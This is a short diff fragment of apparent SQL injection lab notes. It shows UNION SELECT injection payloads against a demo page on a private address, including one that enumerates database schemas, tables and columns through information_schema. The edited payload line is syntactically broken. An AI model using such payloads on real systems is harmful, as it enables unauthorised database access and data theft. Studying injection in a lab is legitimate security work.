@@ -34,7 +34,7 @@ http://10.50.33.78/uniondemo.php?Selection=3 UNION SELECT 1,2,3
   
  
     
-     Audi'UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns # 
+     Audi'UNION SELECT table_schema,table_name,column_name, from information_schema.columns # 
 
 
 -------------------------------------------------------------------------------------------
